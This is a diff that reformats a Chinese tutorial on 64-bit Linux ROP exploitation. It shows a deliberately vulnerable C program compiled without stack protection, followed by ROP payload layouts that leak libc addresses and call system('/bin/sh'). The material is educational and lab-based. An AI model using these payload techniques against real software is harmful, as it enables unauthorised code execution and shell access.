@@ -14,24 +14,24 @@ title: "linux_64 ROP exploit"
 
 漏洞程序 vul.c
 
-  #include <stdio.h>
-  #include <stdlib.h>
-  #include <unistd.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
 
-  void vul_func() {
-      char msg[128];
-      read(STDIN_FILENO, msg, 512);
-  }
+    void vul_func() {
+        char msg[128];
+        read(STDIN_FILENO, msg, 512);
+    }
 
-  int main(int argc, char *argv[]) {
-      vul_func();
-      write(STDOUT_FILENO,"ROP test\n", 9); 
-      return 0;
-  }
+    int main(int argc, char *argv[]) {
+        vul_func();
+        write(STDOUT_FILENO,"ROP test\n", 9); 
+        return 0;
+    }
 
 
 
-编译： gcc -g -no-pie -fno-stack-protector -o vul64 vul.c
+编译： `gcc -g -no-pie -fno-stack-protector -o vul64 vul.c`
 
 由于64位的系统默认会开启`PIE`功能，所以编译时需要手动添加关闭。
 
@@ -118,21 +118,20 @@ x64中最常用ROP的是属于`__libc_csu_init`，但是由于它能控制的参
 
 通过上面的信息作为基础，我们先构造`payload1`功能主要是调用`write`函数，并将`1(STDOUT_FILENO)`,`write@got`,`8(len)`3个参数进行传递获取到内存中write函数的地址
 
-<pre>payload1 = "\x90"*payload_len + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
-payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)	# write函数的调用
-payload1 += "b"*56 + (return_addr=main) # 当write函数调用结束后，会继续`pop6`次，所以返回地址设置到程序的主函数进行`payload2发送`</pre>
+    payload1 = "\x90"*payload_len + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
+    payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)	# write函数的调用
+    payload1 += "b"*56 + (return_addr=main) # 当write函数调用结束后，会继续pop6次，所以返回地址设置到程序的主函数进行payload2发送
 
 获取到`write_addr`的内存地址后，通过偏移开始计算`system`的偏移地址，由于通过`__libc_csu_init`的ROP我们控制的第一个参数只能保存在`edi`，`32`位的空间所以无法直接使用`libc.so`中的`/bin/sh`的内存地址因为它是64位的,所以这里还要再加一层`payload`，通过`read`函数将`/bin/sh`写入到`.bss`段中(因为地址位数比较小，所以可以通过edi来传递)。
 
-<pre>write_addr = u64(p.recv(8))
-system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
-</pre>
+    write_addr = u64(p.recv(8))
+    system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
 
 在获取到`system`地址后，我们需要通过`read`函数将`/bin/sh`写入到程序的`.bss`段中，这样方便我们将该地址传入到`edi`，调用`system`函数拿到`shell`.这个具体的构造可以参照[蒸米的这篇文章](http://cb.drops.wiki/drops/papers-7551.html)来进行操作
 
 <strong>第二种`_dl_runtime_resolve_xsave`:</strong>
 
-<pre>   0x00007ffff7ded240 <+0>:	push   rbx
+<pre>0x00007ffff7ded240 <+0>:	push   rbx
    0x00007ffff7ded241 <+1>:	mov    rbx,rsp
    0x00007ffff7ded244 <+4>:	and    rsp,0xffffffffffffffc0
    0x00007ffff7ded248 <+8>:	sub    rsp,QWORD PTR [rip+0x20f5b9]        # 0x7ffff7ffc808 <_rtld_global_ro+168>
@@ -177,9 +176,9 @@ system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
 
 总体的思路还是通过调用`system`函数将`/bin/sh`的字符串的地址传入，这2个地址都通过在`libc.so`中的偏移来计算
 
-<pre>payload1 = "\x90"*136 + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
-payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)
-payload1 += "b"*56 + (return_addr=main)</pre>
+    payload1 = "\x90"*136 + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
+    payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)
+    payload1 += "b"*56 + (return_addr=main)
 
 测试功能正常：
 
@@ -191,13 +190,14 @@ payload1 += "b"*56 + (return_addr=main)</pre>
 
 构造payload2获取`_dl_runtime_resolve_xsave`的基地址.
 
-<pre>payload2 = "\x90"*136 + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
-payload2 += (r12=write_got) + (r13=1) + (r14=_dl_runtime_resolve_xsave=0x601010) + (r15=8) + (0x4005d0)
-payload2 += "b"*56 + (return_addr=main)</pre>
-
+    payload2 = "\x90"*136 + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
+    payload2 += (r12=write_got) + (r13=1) + (r14=_dl_runtime_resolve_xsave=0x601010) + (r15=8) + (0x4005d0)
+    payload2 += "b"*56 + (return_addr=main)
+    
 最后一步基于我们所有获取到的信息开始调用`system`获取`shell`
 
-<pre>payload3 = "\x90"*136 + (return_addr=pop_rax_ret_addr) + (system_addr) + (_dl_runtime_resolve_xsave+138) + (rax=0) + (rcx=0) + (rdx=0) + (rsi=0) + (binsh_addr) + (r8) + r(r9)</pre>
+    payload3 = "\x90"*136 + (return_addr=pop_rax_ret_addr) + (system_addr) + (_dl_runtime_resolve_xsave+138) 
+    payload3 += (rax=0) + (rcx=0) + (rdx=0) + (rsi=0) + (binsh_addr) + (r8) + r(r9)
 
 这个就是payload3的基本布局.
 
@@ -217,9 +217,9 @@ payload2 += "b"*56 + (return_addr=main)</pre>
 
 因此最终我们的payload4为：
 
-<pre>payload4 = "\x90"*136 + (return_addr=pop_rax_ret) + (system_addr)
-payload4 += (pop_rdi_ret) + (binsh_addr)
-payload4 += (call_rax)</pre>
+    payload4 = "\x90"*136 + (return_addr=pop_rax_ret) + (system_addr)
+    payload4 += (pop_rdi_ret) + (binsh_addr)
+    payload4 += (call_rax)
 
 最终整合所有的payload，利用脚本如下(payload3在脚本中没有使用)：
 
